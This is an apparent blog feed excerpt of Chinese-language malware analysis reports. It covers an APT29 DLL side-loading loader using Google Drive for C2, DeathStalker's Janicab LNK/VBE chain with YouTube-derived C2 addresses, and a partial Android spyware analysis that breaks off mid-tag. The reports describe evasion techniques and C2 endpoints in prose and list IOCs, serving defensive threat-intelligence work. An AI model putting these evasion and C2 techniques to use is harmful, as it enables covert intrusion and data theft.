class="line">vctool140.dll：恶意程序，用于解密文件”<span class="literal">_</span>”</span><br><span class="line">Information.lnk: <span class="type"></span>用于启动agenda.exe</span><br></pre></td></tr></table></figure><p>侧加载执行流程如下图:</p><p><img src="1cc03acb/b6b00d710e9e3a0f65f997eebb662953.png"></p><p>&emsp;&emsp;为了绕过一些程序对模块ntdll和模块wininet对关键函数的hook,<br>在恶意程序vctool140.dll手动加载这两个模块，并创建一个文件映射对象来覆盖模块的代码段。<br>一般安全软件对关键函数进行hook都是在内存进行而不修改原始文件，因此使用原始文件来覆盖内存就可以绕过HOOK。</p><p><img src="1cc03acb/12786208f1ad8943e296b1c0bbf8447e.png"></p><p>&emsp;&emsp;恶意程序解压缩文件”_”为x64 .Net文件并在内存中执行它。该文件使用的压缩算法为”Microsoft Zip(MSZIP)”，在这里通过Cabinet_43来解压缩。解压缩完成后,通过实例化CLR并使用IcorRuntimeHost接口在内存中加载并执行。</p><p><img src="1cc03acb/8247868c2c5da75d2ddde38fef816532.png"></p><h2 id="4-GoogleDriver恶意程序"><a href="#4-GoogleDriver恶意程序" class="headerlink" title="4. GoogleDriver恶意程序"></a>4. GoogleDriver恶意程序</h2><p>&emsp;&emsp;文件GoogleDriver编译时间为” 2022/6/29 23:51:59”，并伪装成Google产品。<br><img src="1cc03acb/cc99cced5bc7db5d6eb509a87832f853.png"></p><p>&emsp;&emsp;该文件使用Google Driver API与Google进行通信，以便上传和下载文件到Google Driver。与Google进行通信的相关信息和加密解密使用的密钥以硬编码的形式存放在程序内。恶意程序和Google进行通信相关的字段为ClientID、ClientSecret和RefreshToken;加解密相关字段为XorKey、AesKey和AesIV。<br><img src="1cc03acb/4ce880eb735ec86be2d427d4866e8886.png"></p><h3 id="与GoogleDriver通信"><a href="#与GoogleDriver通信" class="headerlink" title="与GoogleDriver通信"></a>与GoogleDriver通信</h3><p>&emsp;&emsp;恶意程序与GoogleDriver通信使用过的key和token都已经硬编码在程序内。</p><p><img src="1cc03acb/9f94507cba03c1a95ffb96c60d972396.png"></p><h3 id="GoogleDriver上传或下载文件"><a href="#GoogleDriver上传或下载文件" class="headerlink" title="GoogleDriver上传或下载文件"></a>GoogleDriver上传或下载文件</h3><p>&emsp;&emsp;恶意程序上传文件到GoogleDriver时首先将文件异或加密，使用的密钥为字段Xorkey.<br><img src="1cc03acb/3ba8fea73a9b011e4def1dd1286e4fdf.png"></p><p>&emsp;&emsp;检测当前用户ID是否有有效payload下载。有效Payload在Google中显示为PDF文件,该文件是使用AES-CBC方式加密，解密后为.Net程序集文件。<br><img src="1cc03acb/550b457775b6e99e743ced6953ac1af8.png"></p><h3 id="检测持久性"><a href="#检测持久性" class="headerlink" title="检测持久性"></a>检测持久性</h3><p>&emsp;&emsp;恶意程序每次被运行时，都会检测注册表项”AgendaE”是否存在与注册表”<br>HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run”中，如果不存在则创建该注册表项，设置值为”%Appdata%\agenda.exe”，并将文件”_”、”agenda.exe”、”vcruntime14.dll”和”vctool140.dll”拷贝到目录%Appdata%中。</p><p><img src="1cc03acb/d8fbc257c3f6c328d9214c528e77faef.png"></p><p>&emsp;&emsp;获取用户名并计算其hash用于识别受害者。</p><p><img src="1cc03acb/1e0430fb97f01b4d19cd35dc5402ea2a.png"></p><h3 id="上传用户信息"><a href="#上传用户信息" class="headerlink" title="上传用户信息"></a>上传用户信息</h3><p>&emsp;&emsp;获取受害者机器的用户名、机器名、当前正在运行的进程和网络接口信息等等,上传到Google Driver并保存文件名”{受害者标识ID}.txt”。</p><p><img src="1cc03acb/5b6ff5fd33c403cb7a0165d9a75e5389.png"></p><h3 id="下载并执行payload"><a href="#下载并执行payload" class="headerlink" title="下载并执行payload"></a>下载并执行payload</h3><p>&emsp;&emsp;从Google Driver中下载可用的payload并创建新的线程,在线程中解密和在内存中执行payload。</p><p><img src="1cc03acb/56216dab0491fe9492ed4093d21f1096.png"></p><p>&emsp;&emsp;以一般的.Net恶意程序使用Load来加载程序集的方式不一样,该样本使用方法将”GCHandle.Alloc”来获取数组对象data的gc句柄,再通过”<br>AddrOfPinnedObject”来获取data的指针，将该指针指向的内存设置为可执行内存，最后用GetDelegateForFunctionPointer将data指向的内存作为函数来执行。</p><p><img src="1cc03acb/c3de14373be5ce28d5363e293e027b3b.png"></p><p>&emsp;&emsp;Payload解密时使用AES_CBC方式解密,解密代码如下:</p><p><img src="1cc03acb/1b566fd7f1c4311c84f9bcc33bc864ad.png"></p><h1 id="4-安全检测"><a href="#4-安全检测" class="headerlink" title="4. 安全检测"></a>4. 安全检测</h1><table><thead><tr><th>Hash</th><th>TopEDR检测</th><th>Yara检测</th></tr></thead><tbody><tr><td>5f6d2af2392a37fae04c0f8c911ccc00</td><td>无</td><td>Public-APT.APT_29.HTMLSmuggling.ZIP_82733_00001</td></tr><tr><td>9f9d2499f91623324c124d1b3467428d</td><td>无</td><td>Topsec-APT.APT_29.Downloader.August_5</td></tr><tr><td>b3b95c31fd3239a8b544ac7928e90895</td><td>无</td><td>Public-APT.APT_29.Loader.87221_00001</td></tr></tbody></table><h1 id="5-IOC"><a href="#5-IOC" class="headerlink" title="5. IOC"></a>5. IOC</h1><p>5f6d2af2392a37fae04c0f8c911ccc00<br>9f9d2499f91623324c124d1b3467428d<br>b3b95c31fd3239a8b544ac7928e90895<br>HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\AgendaE<br>porodicno[.]ba/wp-content/Agenda.html</p><h1 id="6-ATT-amp-CK矩阵"><a href="#6-ATT-amp-CK矩阵" class="headerlink" title="6. ATT&amp;CK矩阵"></a>6. ATT&amp;CK矩阵</h1><table><thead><tr><th>Tactic</th><th>ID</th><th>Name</th><th>Description</th></tr></thead><tbody><tr><td>Initial Access</td><td>T1566.001</td><td>Phishing: Spearphishing Attachment</td><td>通过鱼叉式钓鱼电子邮件</td></tr><tr><td>Execution</td><td>T1204.001</td><td>User Execution: Malicious Link</td><td>受害者执行恶意快捷方式</td></tr><tr><td></td><td>T1204.002</td><td>User Execution: Malicious File</td><td>受害者执行恶意文件</td></tr><tr><td></td><td>T1059.007</td><td>Command and Scripting Interpreter: JavaScript</td><td>使用HTML smuggling技术解密数据</td></tr><tr><td>Defense Evasion</td><td>T1036</td><td>Masquerading</td><td>伪装成google相关产品</td></tr><tr><td></td><td>T1622</td><td>Debugger Evasion</td><td>重新映射ntdll的代码段</td></tr><tr><td></td><td>T1140</td><td>Deobfuscate/Decode Files or Information</td><td>异或加密收集到的用户信息</td></tr><tr><td></td><td>T1027</td><td>Obfuscated Files or Information</td><td>文件”_”被加密</td></tr><tr><td></td><td>T1553.002</td><td>Subvert Trust Controls: Code Signing</td><td>滥用具有数字签名的合法文件</td></tr><tr><td></td><td>T1112</td><td>Modify Registry</td><td></td></tr><tr><td>Discovery</td><td>T1082</td><td>System Information Discovery</td><td>收集系统信息、网络接口信息</td></tr><tr><td></td><td>T1057</td><td>Process Discovery</td><td>收集正在运行的进程</td></tr><tr><td>Persistence</td><td>T1547.001</td><td>Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder</td><td>设置注册表自启动项</td></tr><tr><td>Command and Control</td><td>T1105</td><td>Ingress Tool Transfer</td><td>下载.Net程序集</td></tr><tr><td></td><td>T1071.001</td><td>Application Layer Protocol: Web Protocols</td><td>使用https与Google Driver API通信</td></tr></tbody></table><h1 id="7-参考"><a href="#7-参考" class="headerlink" title="7. 参考"></a>7. 参考</h1><p><a href="https://cluster25.io/2022/05/13/cozy-smuggled-into-the-box/">https://cluster25.io/2022/05/13/cozy-smuggled-into-the-box/</a><br><a href="https://unit42.paloaltonetworks.com/cloaked-ursa-online-storage-services-campaigns/">https://unit42.paloaltonetworks.com/cloaked-ursa-online-storage-services-campaigns/</a><br><a href="https://www.microsoft.com/security/blog/2021/05/28/breaking-down-nobeliums-latest-early-stage-toolset/">https://www.microsoft.com/security/blog/2021/05/28/breaking-down-nobeliums-latest-early-stage-toolset/</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;&amp;emsp;&amp;emsp;APT29又叫Nobelium、CozyBear，归属于俄罗斯,从2008年一直以政府、外交官、政治和智库部门。在最近发现该APT组织开始利用合法软件通过侧加载来加载恶意dll文件，并滥用合法的web服务(比如Dropbox、Google Driver)作为C&amp;amp;C通信达到逃避自动分析软件的检测。&lt;/p&gt;
&lt;h1 id=&quot;2-流程图&quot;&gt;&lt;a href=&quot;#2-流程图&quot; class=&quot;headerlink&quot; title=&quot;2. 流程图&quot;&gt;&lt;/a&gt;2. 流程图&lt;/h1&gt;&lt;img src=&quot;/post/1cc03acb/9ebd52394c02a2d5c6ecff777d527339.png&quot; class=&quot;&quot; title=&quot;example&quot;&gt;</summary>
    
    
    
    <category term="APT分析报告" scheme="http://shxi.cc/categories/APT%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/"/>
    
    
    <category term="Nobelium" scheme="http://shxi.cc/tags/Nobelium/"/>
    
  </entry>
  
  <entry>
    <title>DeathStalker组织利用Janicab木马新变种攻击律师事务所</title>
    <link href="http://shxi.cc/post/aa71caad.html"/>
    <id>http://shxi.cc/post/aa71caad.html</id>
    <published>2024-01-10T12:47:07.000Z</published>
    <updated>2024-01-10T12:56:18.994Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>&emsp;&emsp;DeathStalker是一个独特的威胁组织, 专门针对金融机构和律师事务所进行攻击。该组织不受经济利益的驱动，他们不会部署勒索软件，不会窃取付款信息以转售它，或从事通常与网络犯罪黑社会相关的任何类型的活动，他们只对收集敏感的业务信息感兴趣。</p><p>&emsp;&emsp;从该组织以往的攻击行为来看DeathStalker是一群雇佣据,他们提供黑客服务或者在金融界充当某种信息经纪人的角色。他们通常通过包含恶意LNK文件的附件的钓鱼邮件来进行传播，并控制受害者的设备一切去敏感的商业信息，主要使用恶意程序Janicab对目标进行攻击,</p><h1 id="2-攻击链"><a href="#2-攻击链" class="headerlink" title="2.攻击链"></a>2.攻击链</h1><img src="/post/aa71caad/92d2d419189d5968014db7b0845f7b37.png" class="" title="example"><span id="more"></span><h1 id="2-详细分析"><a href="#2-详细分析" class="headerlink" title="2. 详细分析"></a>2. 详细分析</h1><h2 id="1-SMPT-error-txt-lnk分析"><a href="#1-SMPT-error-txt-lnk分析" class="headerlink" title="1.SMPT-error.txt.lnk分析"></a>1.SMPT-error.txt.lnk分析</h2><p>&emsp;&emsp;该文件为Janicab变种，该lnk元数据与以前被发现的旧版本Janicab类似，即SID、字体、屏幕缓冲区大小、窗口大小和MAC地址是相似的。MAC地址都为VMWare虚拟机内的地址。在LNK文件中嵌入了多个文件, 这些文件在LNK文件中的位置如下图:</p><p><img src="aa71caad/9b447f5649375ab3dfc952c27dfcacc6.png"></p><p>&emsp;&emsp;当受害者点击快捷方式时，lnk会将自身拷贝到临时目录,然后通过find找到字符串”#@~^”并将从该字符串到文件末尾的数据保存为文件”.vbe”,该字符串为被加密的vbs脚本的标志。然后使用cscript.exe执行该vbe脚本,并设置第一个参数为该快捷方式文件名，该参数主要用于vbe脚本从lnk文件中解析其他的嵌入文件。</p><p><img src="aa71caad/9847b41abf47bab1c643c098ea393690.png"></p><h2 id="2-stage1-vbe分析"><a href="#2-stage1-vbe分析" class="headerlink" title="2.stage1 vbe分析"></a>2.stage1 vbe分析</h2><p>&emsp;&emsp;该vbe脚本由LNK文件通过命令行调用，解密后的vbs脚本如下图,主要是解密第二阶段的vbe脚本并保存为文件2.vbe然后执行，同样将lnk文件的路径作为第一个参数。<br>&emsp;&emsp;由于在执行2.vbe时，该脚本会调用cmd或者powershell，最后还会调用函数killRunningCmdInstances结束对应的进程。<br><img src="aa71caad/2a413bbe21fe26ffe124d9685bfb96aa.png"></p><p>&emsp;&emsp;提取文件时使用相对于LNK文件的文件偏移和数据大小来从LNK文件中提取数据,这段数据位于LNK文件的文件偏移3643，数据大小为5042。这段vbe脚本被抹去了字符”#@~^”,这样做可以避免某些工具从lnk文件中提取脚本。提取文件具体代码如下:<br><img src="aa71caad/553894d3188c1e9837c240cfe1a7694a.png"></p><p>在脚本中通过WMI查询来获取所有正在运行的进程，并判断要结束的进程是否在这些进程中，如果在则结束进程。<br><img src="aa71caad/d4c01c484fafc8c5b8a591671857a3ea.png"></p><h2 id="3-stage2-2-vbe分析"><a href="#3-stage2-2-vbe分析" class="headerlink" title="3.stage2 2.vbe分析"></a>3.stage2 2.vbe分析</h2><p>与stage1的文件一样，同样为加密后的vbs脚本,该阶段脚本的主要功能为提取嵌入到lnk文件的诱饵文件、cab压缩包和stage3的vbe文件。脚本执行后收件判断第一个参数指向的文件是否存在,如果存在则将其拷贝到临时目录。<br><img src="aa71caad/0a31117cf1f04c932b931568b4c9e191.png"></p><p>在脚本中硬编码了嵌入在LNK文件的各个文件对应的文件偏移和文件大小，通过函数ExtractEmbeddedFile提取并将其保存到临时目录，提取文件与前一阶段类似。<br><img src="aa71caad/fd7e7962c0ca7fe6aa441175071ea1de.png"></p><p>当在xp系统上运行时, 只执行stage3阶段的vbe脚本。<br><img src="aa71caad/9e26bdb11de8b2b97b54ec9b8b00c719.png"></p><h2 id="4-stage3-vbe分析"><a href="#4-stage3-vbe分析" class="headerlink" title="4.stage3 vbe分析"></a>4.stage3 vbe分析</h2><h3 id="检测安全软件"><a href="#检测安全软件" class="headerlink" title="检测安全软件"></a>检测安全软件</h3><p>Vbe脚本运行时首先通过WMI查询来获取当前用户机器安装的所有安全软件。<br><img src="aa71caad/7eba8ac8ea57886934f737909508eb8b.png"></p><h3 id="禁止CCleaner浏览器自动清理"><a href="#禁止CCleaner浏览器自动清理" class="headerlink" title="禁止CCleaner浏览器自动清理"></a>禁止CCleaner浏览器自动清理</h3><p>通过删除垃圾清理软件CCleaner的注册表项来禁止该软件清理临时目录的文件，使位于临时目录的恶意程序不会被其删除。<br><img src="aa71caad/8dc6a3e76a9997f9ab57121f45da0918.png"></p><h3 id="注册表设置"><a href="#注册表设置" class="headerlink" title="注册表设置"></a>注册表设置</h3><p>执行脚本ie.vbe监控IE浏览器是否在执行，如果IE浏览器在执行并且使用的命令行参数包含字符”-Embedding”则结束IE进程，每隔5分钟执行一次前述操作。<br><img src="aa71caad/d11581727de45da09f36fd227b62b842.png"></p><p>将要写入到注册表的自启动项写入文件runOnce.reg，然后通过reg.exe导入文件并在导入完成后删除reg文件。<br><img src="aa71caad/b1b0789cfd0656e3d28df3da2489a81a.png"></p><p>当操作系统为Vista时禁止显示IE浏览器的保护模式的banner。<br><img src="aa71caad/7da6c689740332ead98e50376d37ec88.png"></p><p>设置注册表项禁止IE浏览器的扩展功能。<br><img src="aa71caad/4a766a835712688afcf95e8aef2696c2.png"></p><h3 id="检测虚拟机"><a href="#检测虚拟机" class="headerlink" title="检测虚拟机"></a>检测虚拟机</h3><p>检测操作系统是否包含virtualbox、vmware和parallels的驱动文件来判断是否运行在虚拟机中。<br><img src="aa71caad/749650e0ded1a8391fb8782f517dca03.png"></p><p>判断主板名是否包含指定的关键此来判断是否运行在虚拟机中。<br><img src="aa71caad/b9865b4ffdca538f01c0e881f547d652.png"></p><p>检测网卡的mac地址来判断是否运行在虚拟机中。<br><img src="aa71caad/9f7f8b3d54cadaee9d93f30ce808cf27.png"></p><h3 id="检测分析工具"><a href="#检测分析工具" class="headerlink" title="检测分析工具"></a>检测分析工具</h3><p>遍历进程判断是否有列表中的进程名在运行中。<br><img src="aa71caad/9dc32c2377ba5ac8beeaedff4001c727.png"></p><h3 id="删除浏览器cookie"><a href="#删除浏览器cookie" class="headerlink" title="删除浏览器cookie"></a>删除浏览器cookie</h3><p>删除火狐浏览器、谷歌浏览器和IE浏览器的cookie数据。<br><img src="aa71caad/cae3ad9a76014af0635224cd74d8f5e7.png"></p><h3 id="从Youtube视频获取C-amp-C地址"><a href="#从Youtube视频获取C-amp-C地址" class="headerlink" title="从Youtube视频获取C&amp;C地址"></a>从Youtube视频获取C&amp;C地址</h3><p>&emsp;&emsp;与大部分恶意软件不同，当前版本的Janicab从两个链接的源码中获取C&amp;C地址。从Youtube链接的播放页面中获取网页源码，并使用正则匹配从字符串”we need (.*) views”中获取一个数字然后将其除以1337得到一个整数,再通过一系列运算转换成点分式后拼接成””http://{ip地址}/B2mV-VzVc-81Az-135J。</p><p>使用Get请求访问路径”Status2.php”，如果返回的数据为”OKOK”，则表示该服务有效。<br><img src="aa71caad/a1c812933cd13d02a1c7539864860cc0.png"></p><p>将整数转换成IP地址的代码如下:<br><img src="aa71caad/7077812be03cf7a4cac2793155b45b71.png"></p><h3 id="C-amp-C通信"><a href="#C-amp-C通信" class="headerlink" title="C&amp;C通信"></a>C&amp;C通信</h3><p>如果检测到文件再虚拟机中运行则get请求形式并将电脑名、用户名和检测到的数据发送到rit.php。如果返回的数据不为”skip”并且文件xitx不存在则退出进程。<br><img src="aa71caad/a04b3b675c0fc8a00549509fa9ee6ae4.png"></p><p>如果keylogger功能启用并且kl文件存在, 则将文件数据base64编码后上传到路径rk.php。<br><img src="aa71caad/54e94b84d9a8dcccae09efe9345432aa.png"></p><p>如果文件”~PF214C.tmp”存在则将文件数据base64编码后上传到路径”rs.php”。<br><img src="aa71caad/ad8443f7d2341356af82e9eb4facf058.png"></p><p>发送Get请求从从c.php，并从返回的网页数据中解析cmd命令然后执行。<br><img src="aa71caad/d7891e59d7f005297a06a6e283ed10d7.png"></p><p>执行文件kl并调用其导出函数MyDllEntryPoint执行键盘记录器功能，截图功能的实现。<br><img src="aa71caad/e8e8c1dc7134bc7342867d7f05d1f220.png"></p><p>下表为Janicab实现的C&amp;C指令:</p><table><thead><tr><th>PHP路径</th><th>描述</th></tr></thead><tbody><tr><td>Status2.php</td><td>检测服务器状态</td></tr><tr><td>a.php</td><td>接收信标数据</td></tr><tr><td>gid.php?action=add</td><td>添加新的受害者数据</td></tr><tr><td>rit.php</td><td>上传受害者机器上安装的安全软件、是否在虚拟机运行等状态</td></tr><tr><td>c.php</td><td>接收cmd命令并执行</td></tr><tr><td>rs.php</td><td>上传屏幕截图数据</td></tr><tr><td>rk.php</td><td>上传键盘记录数据</td></tr><tr><td>sm.php</td><td>当受害者机器上存在安全软件时C&amp;C服务器提供的执行方式, 比如设置runOnce注册表</td></tr><tr><td>d.php</td><td>下载文件并执行</td></tr></tbody></table><h1 id="IOCS"><a href="#IOCS" class="headerlink" title="IOCS"></a>IOCS</h1><p>aacd0752289f3b0c6be3fadba368a9a71e46a228 F1B5675E1A60049C7CD823EBA93FE977<br>hxxps://youtu.be/aZRJQdwN4-g<br>hxxps://plus.google.com/108098760042015113400/posts?hl=en</p><h1 id="4-ATT-amp-CK矩阵"><a href="#4-ATT-amp-CK矩阵" class="headerlink" title="4.ATT&amp;CK矩阵"></a>4.ATT&amp;CK矩阵</h1><table><thead><tr><th>Tactic</th><th>ID</th><th>Name</th><th>Description</th></tr></thead><tbody><tr><td>Command and Control</td><td>T1105</td><td>Ingress Tool Transfer</td><td>从C&amp;C下载payload</td></tr><tr><td></td><td>T1071</td><td>Application Layer Protocol</td><td>使用http/https协议进行通信</td></tr><tr><td>Execution</td><td>T1204</td><td>User Execution</td><td>诱导受害者执行</td></tr><tr><td></td><td>T1053</td><td>Scheduled Task/Job</td><td>创建计划任务执行恶意dll</td></tr><tr><td></td><td>T1059</td><td>Command and Scripting Interpreter</td><td>执行cmd或powershell命令</td></tr><tr><td>Persistence</td><td>T1037</td><td>Boot or Logon Initialization Scripts</td><td>创建自启动注册表项</td></tr><tr><td>Collection</td><td>T1113</td><td>Screen Capture</td><td>收集屏幕截图</td></tr><tr><td></td><td>T1056</td><td>Input Capture</td><td>收集键盘记录</td></tr><tr><td>Defense Evasion</td><td>T1497</td><td>Virtualization/Sandbox Evasion</td><td>检测是否在虚拟机环境下运行</td></tr><tr><td></td><td>T1070</td><td>Indicator Removal on Host</td><td>删除恶意程序在执行中创建的各种文件</td></tr><tr><td></td><td>T1036</td><td>Masquerading</td><td>伪装成文件Notepad的快捷方式</td></tr><tr><td></td><td>T1027</td><td>Obfuscated Files or Information</td><td>Vbs脚本加密成vbe</td></tr><tr><td>Discovery</td><td>T1057</td><td>Process Discovery</td><td>判断是否有调试器、文件监控等进程在运行</td></tr><tr><td>Initial Access</td><td>T1566</td><td>Phishing</td><td>通过鱼叉式网络钓鱼投递恶意程序</td></tr></tbody></table>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;&amp;emsp;&amp;emsp;DeathStalker是一个独特的威胁组织, 专门针对金融机构和律师事务所进行攻击。该组织不受经济利益的驱动，他们不会部署勒索软件，不会窃取付款信息以转售它，或从事通常与网络犯罪黑社会相关的任何类型的活动，他们只对收集敏感的业务信息感兴趣。&lt;/p&gt;
&lt;p&gt;&amp;emsp;&amp;emsp;从该组织以往的攻击行为来看DeathStalker是一群雇佣据,他们提供黑客服务或者在金融界充当某种信息经纪人的角色。他们通常通过包含恶意LNK文件的附件的钓鱼邮件来进行传播，并控制受害者的设备一切去敏感的商业信息，主要使用恶意程序Janicab对目标进行攻击,&lt;/p&gt;
&lt;h1 id=&quot;2-攻击链&quot;&gt;&lt;a href=&quot;#2-攻击链&quot; class=&quot;headerlink&quot; title=&quot;2.攻击链&quot;&gt;&lt;/a&gt;2.攻击链&lt;/h1&gt;&lt;img src=&quot;/post/aa71caad/92d2d419189d5968014db7b0845f7b37.png&quot; class=&quot;&quot; title=&quot;example&quot;&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>双尾蝎利用恶意Android程序攻击中东地区</title>
    <link href="http://shxi.cc/post/326471a1.html"/>
    <id>http://shxi.cc/post/326471a1.html</id>
    <published>2024-01-07T08:49:04.000Z</published>
    <updated>2024-01-08T06:04:43.973Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>&emsp;&emsp;2016年1月起至今，双尾蝎组织对巴勒斯坦教育机构、军事机构等重要领域展开了有组织、有计划、有针对性的长时间不间断攻击。攻击平台包括Windows 与 Android，攻击范围主要为中东地区</p><p>&emsp;&emsp;此次捕获的恶意软件名为”Google Play Installer”，安装后伪装成Telegram应用程序类似的图标和界面。</p><h1 id="样本信息"><a href="#样本信息" class="headerlink" title="样本信息"></a>样本信息</h1><table><thead><tr><th>md5</th><th>dd4596cf68c85eb135f7e0ad763e5dab</th></tr></thead><tbody><tr><td>文件类型</td><td>Apk</td></tr><tr><td>包名</td><td>org.telegram.light</td></tr><tr><td>文件大小</td><td>26MB</td></tr><tr><td>应用名</td><td>Google Play Installer</td></tr></tbody></table><h1 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h1><img src="/post/326471a1/423d81fe19ff15e345ef18bc35968493.png" class="" title="example"><span id="more"></span><h1 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h1><h2 id="AndroidManifest-xml分析"><a href="#AndroidManifest-xml分析" class="headerlink" title="AndroidManifest.xml分析"></a>AndroidManifest.xml分析</h2><h3 id="4-1-1权限声明"><a href="#4-1-1权限声明" class="headerlink" title="4.1.1权限声明"></a>4.1.1权限声明</h3><p>&emsp;&emsp;该程序申请了很多权限,包括读写短信、读取通讯录、录音、通过GPS获取当前位置等危险权限</p><p><img src="326471a1/0be9d828f8b38baa013b499d14c5f127.png"></p><p>如下是使用到的权限以及对应的描述</p><table><thead><tr><th>权限</th><th>描述</th></tr></thead><tbody><tr><td>android.permission.CHANGE_WIFI_STATE</td><td>改变WIFI状态</td></tr><tr><td>android.permission.INTERNET</td><td>访问网络连接</td></tr><tr><td>android.permission.ACCESS_NETWORK_STATE</td><td>获取网络信息状态</td></tr><tr><td>android.permission.KILL_BACKGROUND_PROCESSES</td><td>杀死后台进程</td></tr><tr><td>android.permission.READ_CALL_LOG</td><td>读取通话记录</td></tr><tr><td>android.permission.READ_PHONE_STATE</td><td>读取电话状态</td></tr><tr><td>android.permission.REORDER_TASKS</td><td>排序系统任务</td></tr><tr><td>android.permission.WRITE_CONTACTS</td><td>写入通讯录</td></tr><tr><td>android.permission.READ_CONTACTS</td><td>读取通讯录</td></tr><tr><td>android.permission.GET_ACCOUNTS</td><td>访问Gmail账户列表</td></tr><tr><td>android.permission.REQUEST_INSTALL_PACKAGES</td><td>请求安装APP</td></tr><tr><td>android.permission.ACCESS_FINE_LOCATION</td><td>通过GPS获取当前位置</td></tr><tr><td>android.permission.RECEIVE_SMS</td><td>接收短信</td></tr><tr><td>android.permission.READ_SMS</td><td>读取短信</td></tr><tr><td>android.permission.GET_TASKS</td><td>允许程序获取当前或者最近允许的应用</td></tr><tr><td>android.permission.USE_CREDENTIALS</td><td>允许程序请求验证从AccountManager</td></tr><tr><td>android.permission.SEND_SMS</td><td>编写和发送短信</td></tr><tr><td>android.permission.WRITE_EXTERNAL_STORAGE</td><td>写入内存卡</td></tr><tr><td>android.permission.READ_EXTERNAL_STORAGE</td><td>读取内存卡</td></tr><tr><td>android.permission.CAMERA</td><td>允许摄像头进行拍照</td></tr><tr><td>android.permission.RECORD_AUDIO</td><td>通过手机或者耳机的麦克风来录音</td></tr><tr><td>android.permission.PROCESS_OUTGOING_CALLS</td><td>允许程序修改监视、修改或者放弃拨打的电话</td></tr><tr><td>android.permission.CALL_PHONE</td><td>拨打电话</td></tr><tr><td>android.permission.RECEIVE_BOOT_COMPLETED</td><td>允许程序开机自动运行</td></tr><tr><td>android.permission.WRITE_CALL_LOG</td><td>允许程序写入手机的呼叫记录数据</td></tr><tr><td>android.permission.WAKE_LOCK</td><td>允许程序在手机屏幕关闭后后台程序仍然允许</td></tr><tr><td>android.permission.MODIFY_AUDIO_SETTINGS</td><td>修改声音设置信息</td></tr><tr><td>android.permission.DISABLE_KEYGUARD</td><td>禁止键盘锁</td></tr><tr><td>android.permission.READ_PROFILE</td><td>读取配置文件</td></tr><tr><td>android.permission.SYSTEM_ALERT_WINDOW</td><td>显示系统窗口</td></tr><tr><td>android.permission.ACCESS_WIFI_STATE</td><td>访问WIFI状态</td></tr><tr><td>android.permission.CHANGE_WIFI_STATE</td><td>改变WIFI状态</td></tr><tr><td>android.permission.ACCESS_NETWORK_STATE</td><td>访问网络状态</td></tr><tr><td>android.permission.REORDER_TASKS</td><td>允许程序重新排序系统任务</td></tr></tbody></table><h3 id="4-1-2-Application"><a href="#4-1-2-Application" class="headerlink" title="4.1.2 Application"></a>4.1.2 Application</h3><p>设置App入口点为类”net.axel.app.app.AppControler”,App运行后,该类会在App的所有组件之前进行实例化。</p><p><img src="326471a1/37b067bf004e33e10aef0929b1fe87f7.png"></p><p>APP使用”goole Play Installer”为应用名,从图标和应用名看出该程序伪装成Google安装程序来诱导受害者安装。安装后在应用列表显示的图标为Telegram。</p><p><img src="326471a1/792eddb23e0e3b91ad2aeaa07cf7f5d2.png"></p><p><img src="326471a1/c03ec833c9c851b4cceba2baa5a559eb.png"></p><h3 id="4-1-3-组件activity"><a href="#4-1-3-组件activity" class="headerlink" title="4.1.3 组件activity"></a>4.1.3 组件activity</h3><p>&emsp;&emsp;Activity-alias即activity的别名，可以重新定义当前某个activity的一些信息,这里用来动态更换图标和应用名,以便达到伪装其他应用或者使用透明图片来隐藏自身的目的。<br>&emsp;&emsp;通过targetActivity可以看出这些activity-alias调起的都是类”net.axel.app.activities.Main”。除了label为”Telegram”的activity-alias,其他activity-alias默认处于被禁用状态,因此在安装成功的时候显示的是Tekegram的图标。</p><p><img src="326471a1/0cbd42ed08a0f4534a9bbaefe98d5c02.png"></p><p>对应的activity的lable和图标如下表</p><table><thead><tr><th>lable ID</th><th>Lable名</th><th>Activity类名</th><th>图标</th></tr></thead><tbody><tr><td>app_wifi</td><td>Wifi</td><td>net.axel.app.Extra_wifi</td><td><img src="326471a1/f54528410f921f1c57a03f18499d180a.png"></td></tr><tr><td>app_chrome</td><td>Chrome</td><td>net.axel.app.Extra_chrom</td><td><img src="326471a1/658ccf08a3f84871a3ae4c31c1e35d91.png"></td></tr><tr><td>app_play_services</td><td>Play Services</td><td>net.axel.app.Extra_Play_services</td><td><img src="326471a1/55fcbc89c1b85a8f6268bc03c425e4ba.png"></td></tr><tr><td>app_bixby</td><td>Maps</td><td>net.axel.app.Extra_Bixby</td><td><img src="326471a1/35d5ebe8474e3c07e1033f72112bb371.png"></td></tr><tr><td>app_name</td><td>Google Play Installer</td><td>net.axel.app.Extra_Non_Trans</td><td><img src="326471a1/9dd75cab618b6eb653125a4de411884a.png"></td></tr><tr><td>sys_name</td><td>为空</td><td>net.axel.app.Extra</td><td>透明图标(用于隐藏自身图标)</td></tr><tr><td></td><td>Telegram</td><td>net.axel.app.Launcher</td><td><img src="326471a1/d8ca814bd8c8e82ca742d0c6b8961f02.png"></td></tr></tbody></table><p>以下4个activity伪装成正常界面,实际上在背后偷偷执行恶意代码。</p><p><img src="326471a1/a6b89dbdf006ab950f6882524689e98f.png"></p><p>第一个和第四个activity伪装成”Telegram Message”界面。</p><p><img src="326471a1/f507df0691fdf4458057e1c36d738aeb.png"></p><p>第二个伪装更新界面,其中标题、图标、描述和按钮文本信息通过FCM的云消息下发并显示在如下界面中。</p><p><img 